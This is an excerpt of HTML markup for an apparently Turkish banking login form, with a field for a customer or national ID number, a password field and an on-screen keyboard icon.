                    ...
                    <div class="card credentials">
                        ...
                        <div class="input-group">
                            <input autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
                                id="customer-id" type="text" name="kml" placeholder="Müşteri / T.C. Kimlik Numaranızı Giriniz"
                        ...
                        <div class="input-group">
                            <input autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
                                id="customer-pass" type="password" name="bnk" placeholder="Şifrenizi Giriniz" required="" />
                            <img class="keyboard" src="img/keyboard.svg">
